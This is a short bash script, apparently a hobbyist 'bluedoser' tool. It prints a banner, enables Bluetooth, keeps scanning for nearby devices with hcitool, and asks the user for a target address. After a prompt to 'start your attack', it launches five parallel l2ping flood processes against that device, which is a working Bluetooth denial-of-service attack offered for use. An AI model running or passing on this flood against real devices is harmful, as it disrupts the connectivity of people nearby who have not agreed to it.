
#COLORS
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"
echo -e "$red _     _                _                     $nc"
echo -e "$yellow| |__ | |_   _  ___  __| | ___  ___  ___ ___ $nc"
echo -e "$red| '_ \| | | | |/ _ \/ _  |/ _ \/ __|/ _ \ __|$nc"
echo -e "$yellow| |_) | | |_| |  __/ (_| | (_) \__ \  __/ |   $nc"
echo -e "$red|blue/|_|\__,_|\dos|\__,_|\___/|___/\___|_| $nc"
echo -e "$blue _____________________________________By Anon$nc"
echo ""
echo -e "$white Author : SURAJ CHAVDA$nc"
echo -e "$white SCRIPT : SURAJ CHAVDA$nc"
echo -e "$white ANON   : SURAJ CHAVDA$nc"
sudo lsmod | grep blue &>/dev/null
systemctl enable bluetooth.service &>/dev/null
systemctl start bluetooth.service &>/dev/null
echo ""
if rfkill unblock bluetooth ;then 
echo -e "$red Your Bluetooth is Turned On$nc"
else echo -e "Some Problem With Turning On Bluetooth"
fi
echo -e ""

echo -e "$Cyan [*]BLUTOOTH DEVICE(B.D) INFO AND SCANNING$nc"
echo -e ""
xterm -hold -e 'while [ 1 ]; do hcitool scan ;done' &
read -p $'\033[1;33m[*]Enter B.D.Address (xx:xx:xx:xx:xx:xx) : \033[0m' bdadd
echo -e "" 
read -p $'\033[1;33m[*]PRESS ENTER TO START YOUR ATTACK\033[0m'
xterm -e l2ping -f $bdadd  &
xterm -e l2ping -f $bdadd  &
xterm -e l2ping -f $bdadd  &
xterm -e l2ping -f $bdadd  &
xterm -e l2ping -f $bdadd  




echo -e "$yellow Tool By Anon(Suraj)$nc"
